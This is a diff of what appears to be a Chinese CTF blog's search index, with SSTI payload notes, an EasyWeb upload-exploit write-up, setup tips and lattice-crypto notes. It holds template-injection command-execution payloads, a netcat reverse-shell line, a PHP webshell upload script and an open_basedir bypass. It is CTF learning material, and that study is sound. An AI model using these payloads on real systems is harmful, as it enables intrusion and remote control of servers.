@@ -58,7 +58,7 @@
 <p>在desktop里面找到了userflag</p>
 <p><img src="https://s2.loli.net/2023/06/13/2PE5Tq1nGukcRgZ.png"></p>
 <h2 id="提权">提权</h2>
-<p>找到了这个<a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation">AD CS Domain Escalation - HackTricks</a></p>
+<p>找windows提权的时候找到了这个<a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation">AD CS Domain Escalation - HackTricks</a></p>
 <p>找了一个xd的exe集合包<a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">r3motecontrol/Ghostpack-CompiledBinaries: Compiled Binaries for Ghostpack (.NET v4.0) (github.com)</a></p>
 <p><img src="https://s2.loli.net/2023/06/13/8IvxrKgzoQC2L6Y.png"></p>
 <p>微软NB</p>
@@ -80,45 +80,6 @@
       </tags>
   </entry>
   <entry>
-    <title>SSTI模版注入</title>
-    <url>/2022/07/07/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="ssti">SSTI</h1>
-<h2 id="ssti判断">SSTI判断</h2>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="number">7</span>+<span class="number">7</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p>输入会回显，判断回显值。</p>
-<span id="more"></span>
-<h2 id="常用的模版引擎">常用的模版引擎</h2>
-<h3 id="smarty">smarty</h3>
-<p>Smarty支持使用{php}{/php}标签来执行被包裹其中的php指令，但是在Smarty 3.1，{php}仅在SmartyBC中可用。</p>
-<p>{literal}可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。</p>
-<p>在PHP5即可使用</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="title function_ invoke__">phpinfo</span>();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>静态方法：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;<span class="built_in">self</span>::<span class="title function_ invoke__">getStreamVariable</span>(<span class="string">&quot;file:///etc/passwd&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
-<p>在3.1.30的Smarty版本中官方已经把该静态方法删除。利用 Smarty_Internal_Write_File 类的writeFile方法来写shell也由于同样的原因无法使用。</p>
-<p>if头：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">phpinfo</span>()&#125;&#123;/<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="twig">twig</h3>
-<p>相比于 Smarty ,Twig 无法调用静态方法，并且所有函数的返回值都转换为字符串，也就是我们不能使用 <code>self::</code> 调用静态变量了。</p>
-49
-<p>会输出49.</p>
-<p>payload：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.<span class="title function_ invoke__">registerUndefinedFilterCallback</span>(<span class="string">&quot;exec&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.<span class="title function_ invoke__">getFilter</span>(<span class="string">&quot;cat /flag&quot;</span>)&#125;&#125; <span class="comment"># 执行任意指令</span></span><br></pre></td></tr></table></figure>
-<h3 id="flaskjinja2">flask/jinja2</h3>
-49
-<p>会输出7777777.</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/tmp/evil&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;from os import system%0aSHELL = system&#x27;</span>) &#125;&#125;</span><br><span class="line">//写文件</span><br><span class="line">&#123;&#123; config.from_pyfile(<span class="string">&#x27;/tmp/evil&#x27;</span>) &#125;&#125;</span><br><span class="line">//加载system</span><br><span class="line">&#123;&#123; config[<span class="string">&#x27;SHELL&#x27;</span>](<span class="string">&#x27;nc xxxx xx -e /bin/sh&#x27;</span>) &#125;&#125;</span><br><span class="line">//执行命令反弹SHELL</span><br><span class="line">payload:?name=&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="tornado">tornado</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">117.78</span><span class="number">.26</span><span class="number">.79</span>:<span class="number">31093</span>/error?msg=&#123;&#123;handler.settings&#125;&#125; <span class="comment">#获取环境变量，即可获得cookie</span></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>WEB</category>
-      </categories>
-      <tags>
-        <tag>注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>buu刷题记录：[pasecactf_2019]tornado_casino</title>
     <url>/2022/06/03/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%9A%5Bpasecactf_2019%5Dtornado_casino/</url>
     <content><![CDATA[<p>首先打开py文件看一眼，输3退出，输2再输b33_1_4m_b3333会让某个自减的东西加一千，输1时会生成一个32位的随机数，并且将输入的随机数与其自己生成的随机数比较，相等则返回flag。</p>
@@ -136,60 +97,6 @@
         <tag>mt19937</tag>
         <tag>pwntools</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>buu刷题记录：[SUCTF_2019]EasyWeb</title>
-    <url>/2022/07/24/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%9A-SUCTF-2019-EasyWeb/</url>
-    <content><![CDATA[<p>题目首先给出了源码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    <span class="variable">$userdir</span> = <span class="string">&quot;upload/tmp_&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$userdir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$userdir</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$extension</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph/i&quot;</span>,<span class="variable">$extension</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">mb_strpos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp_name</span>), <span class="string">&#x27;&lt;?&#x27;</span>)!==False) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$tmp_name</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="variable">$path</span>= <span class="variable">$userdir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">        @<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>, <span class="variable">$path</span>);</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$hhh</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$hhh</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$hhh</span>)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="variable">$hhh</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$character_type</span> = <span class="title function_ invoke__">count_chars</span>(<span class="variable">$hhh</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$character_type</span>)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$hhh</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><span id="more"></span></p>
-<p>第一步的思路就是绕过waf执行get_the_flag函数，异或绕过</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line"><span class="comment">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span></span><br></pre></td></tr></table></figure>
-<p>第二步上传文件，base64编码再解码</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line">htaccess = <span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#define width 1337</span></span><br><span class="line"><span class="string">#define height 1337 </span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .abc</span></span><br><span class="line"><span class="string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.abc&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shell = <span class="string">b&quot;GIF89a12&quot;</span> + base64.b64encode(<span class="string">b&quot;&lt;?php eval($_REQUEST[&#x27;cmd&#x27;]);?&gt;&quot;</span>)</span><br><span class="line">url = <span class="string">&quot;http://edaa6186-d365-4fdb-bcc8-d15d8c36cb3b.node4.buuoj.cn:81/?_=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag&quot;</span></span><br><span class="line"> </span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;.htaccess&#x27;</span>,htaccess,<span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">data = &#123;<span class="string">&quot;upload&quot;</span>:<span class="string">&quot;Submit&quot;</span>&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"> </span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;shell.abc&#x27;</span>,shell,<span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
-<p>第三步绕过open_basedir，这个函数规定活动的文件夹范围。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cmd=<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>img%<span class="number">27</span>);<span class="title function_ invoke__">ini_set</span>(%<span class="number">27</span>open_basedir%<span class="number">27</span>,%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">ini_set</span>(%<span class="number">27</span>open_basedir%<span class="number">27</span>,%<span class="number">27</span>/%<span class="number">27</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">cmd=<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>img%<span class="number">27</span>);<span class="title function_ invoke__">ini_set</span>(%<span class="number">27</span>open_basedir%<span class="number">27</span>,%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">ini_set</span>(%<span class="number">27</span>open_basedir%<span class="number">27</span>,%<span class="number">27</span>/%<span class="number">27</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>));</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>WEB</category>
-      </categories>
-      <tags>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>python环境配置</title>
-    <url>/2022/09/27/python%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[<h2 id="安装anaconda">1.安装anaconda</h2>
-<p>首先去<a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/">镜像站</a>下载anaconda的镜像</p>
-<p><img src="https://s2.loli.net/2022/09/27/47ldkv5GrE2PFDX.png"></p>
-<span id="more"></span>
-<p>安装anaconda</p>
-<p><img src="https://s2.loli.net/2022/09/27/C3b1p9ikwUmAfzY.png"></p>
-<p>第一个必选，第二个会在电脑装一个python3.7，如果没有python环境勾选</p>
-<h2 id="安装pycharm">2.安装pycharm</h2>
-<p>去<a href="https://www.jetbrains.com/zh-cn/pycharm/download/#section=windows">官网</a>下载pycharm专业版，在网上有几率可以找到可用的激活码，或者可以去jetbrain的官网进行<a href="https://www.jetbrains.com/shop/eform/students">学生认证</a>.</p>
-<p><img src="https://s2.loli.net/2022/09/27/hquUvejQmnFRENG.png"></p>
-<p>1和3都是可选，1是在桌面创建快捷方式，3是在右键菜单创建打开方式</p>
-<p>打开后可以在<img src="https://s2.loli.net/2022/09/27/NdHJ89pzf3hTIs4.png"></p>
-<p>登录有学生优惠的账号，也可以在<img src="https://s2.loli.net/2022/09/27/QhaFLuIWmsGonkj.png"></p>
-<p>输入网上找的可用的激活码。</p>
-<p>新建一个项目</p>
-<p><img src="https://s2.loli.net/2022/09/27/CBk72cvTs4UGPIj.png"></p>
-<p><img src="https://s2.loli.net/2022/09/27/a7OE9GoWF3M41w6.png"></p>
-<p><img src="https://s2.loli.net/2022/09/27/7q1YoTiPVEk8p64.png"></p>
-<p>选择Anaconda下的python.exe文件</p>
-<p>可以运行即可</p>
-<p><img src="https://s2.loli.net/2022/09/27/SJuLzUbTZNF3Iaw.png"></p>
-<p>然后用pip安装常用包</p>
-<p>在cmd中输入</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m pip install --upgrade pip</span><br></pre></td></tr></table></figure>
-<p>升级pip版本，然后输入</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install pycryptodome</span><br></pre></td></tr></table></figure>
-<p>和</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure>
-<p>安装密码需要的Crypto库和pwn需要的pwntools。</p>
-]]></content>
   </entry>
   <entry>
     <title>六月作业</title>
@@ -278,6 +185,26 @@ B=(k_1k_2N,k_2(g+k_1s)M_1,g(k_1-k_2)M_2,(g+k_1s)(g+k_2s))\\
       </categories>
       <tags>
         <tag>RSA</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>buu刷题记录：[SUCTF_2019]EasyWeb</title>
+    <url>/2022/07/24/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%9A-SUCTF-2019-EasyWeb/</url>
+    <content><![CDATA[<p>题目首先给出了源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    <span class="variable">$userdir</span> = <span class="string">&quot;upload/tmp_&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$userdir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$userdir</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$extension</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph/i&quot;</span>,<span class="variable">$extension</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">mb_strpos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp_name</span>), <span class="string">&#x27;&lt;?&#x27;</span>)!==False) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$tmp_name</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="variable">$path</span>= <span class="variable">$userdir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">        @<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>, <span class="variable">$path</span>);</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$hhh</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$hhh</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$hhh</span>)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="variable">$hhh</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$character_type</span> = <span class="title function_ invoke__">count_chars</span>(<span class="variable">$hhh</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$character_type</span>)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$hhh</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><span id="more"></span></p>
+<p>第一步的思路就是绕过waf执行get_the_flag函数，异或绕过</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line"><span class="comment">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span></span><br></pre></td></tr></table></figure>
+<p>第二步上传文件，base64编码再解码</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line">htaccess = <span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#define width 1337</span></span><br><span class="line"><span class="string">#define height 1337 </span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .abc</span></span><br><span class="line"><span class="string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.abc&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shell = <span class="string">b&quot;GIF89a12&quot;</span> + base64.b64encode(<span class="string">b&quot;&lt;?php eval($_REQUEST[&#x27;cmd&#x27;]);?&gt;&quot;</span>)</span><br><span class="line">url = <span class="string">&quot;http://edaa6186-d365-4fdb-bcc8-d15d8c36cb3b.node4.buuoj.cn:81/?_=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag&quot;</span></span><br><span class="line"> </span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;.htaccess&#x27;</span>,htaccess,<span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">data = &#123;<span class="string">&quot;upload&quot;</span>:<span class="string">&quot;Submit&quot;</span>&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"> </span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;shell.abc&#x27;</span>,shell,<span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
+<p>第三步绕过open_basedir，这个函数规定活动的文件夹范围。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cmd=<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>img%<span class="number">27</span>);<span class="title function_ invoke__">ini_set</span>(%<span class="number">27</span>open_basedir%<span class="number">27</span>,%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">ini_set</span>(%<span class="number">27</span>open_basedir%<span class="number">27</span>,%<span class="number">27</span>/%<span class="number">27</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">cmd=<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>img%<span class="number">27</span>);<span class="title function_ invoke__">ini_set</span>(%<span class="number">27</span>open_basedir%<span class="number">27</span>,%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">ini_set</span>(%<span class="number">27</span>open_basedir%<span class="number">27</span>,%<span class="number">27</span>/%<span class="number">27</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>));</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>WEB</category>
+      </categories>
+      <tags>
+        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -371,45 +298,6 @@ B=(k_1k_2N,k_2(g+k_1s)M_1,g(k_1-k_2)M_2,(g+k_1s)(g+k_2s))\\
       </tags>
   </entry>
   <entry>
-    <title>格密码</title>
-    <url>/2022/06/20/%E6%A0%BC%E5%AF%86%E7%A0%81/</url>
-    <content><![CDATA[<h1 id="格密码">格密码</h1>
-<p>一直想做一个整理，鸽了两个多月，考完试把之前鸽的补一下</p>
-<span id="more"></span>
-<h2 id="格中的困难问题">格中的困难问题</h2>
-<h3 id="svp最短向量问题">SVP：最短向量问题</h3>
-<p>给定一个基为B的Lattice L(B)，找到一个这个基构成的格点Bx:x，使得这个点距离0坐标点的距离最近。</p>
-<p>SVP的宽松版本：<img src="https://www.zhihu.com/equation?tex=SVP_%5Cgamma" alt="[公式]">，即找到一个基构成的格点Bx:x，使得这个店距离原点的距离小于最短距离的<img src="https://www.zhihu.com/equation?tex=%5Cgamma" alt="[公式]">倍即可。</p>
-<h3 id="cvp最近向量问题">CVP：最近向量问题</h3>
-<p>给定连续空间中任意的一个点t，找到距离这个点最近的格点Bx。</p>
-<p>同理可得，我们也可以得到CVP的宽松版，即<img src="https://www.zhihu.com/equation?tex=CVP_%5Cgamma" alt="[公式]">。</p>
-<h3 id="sivp最短独立向量问题">SIVP：最短独立向量问题</h3>
-<p>给定一个Lattice <img src="https://www.zhihu.com/equation?tex=%5Cmathcal%7BL%7D%28%5Cmathbf%7BB%7D%29" alt="[公式]">，找到<img src="https://www.zhihu.com/equation?tex=n" alt="[公式]">个线性独立的向量<img src="https://www.zhihu.com/equation?tex=%5Cmathbf%7BBx_1%2C+%5Cdots%2C+Bx_n%7D" alt="[公式]">并且这些向量的长度都要小于等于最长的最短向量<img src="https://www.zhihu.com/equation?tex=%5Clambda_n" alt="[公式]">。</p>
-<p>和SVP与CVP问题一样，我们也可以给出SIVP问题的宽松版定义，即<img src="https://www.zhihu.com/equation?tex=SIVP_%5Cgamma" alt="[公式]">。</p>
-<h2 id="基于lattice的信息传输">基于lattice的信息传输</h2>
-<p>首先，我们把需要传输的消息映射到Lattice中的一个点上，即Bx，然后把L和Bx发送出去。因为噪音，Bx会在L上产生偏移，首先我们需要求解SVP问题，寻找到L上的最短向量，并让其与噪音相比较，观察能否恢复出明文。然后若想恢复出明文，需要解决CVP问题，找到被噪声影响的密文的最近格点，一般来说就是映射到格上的明文。</p>
-<h2 id="lll算法">LLL算法</h2>
-<p>施密特正交化可以让一组坏基变成一组垂直的好基，而LLL算法可以找到在正交化的基础上最短或者近似最短的正交基。</p>
-<h2 id="lwe问题错误学习">LWE问题：错误学习</h2>
-<p>先放一道题</p>
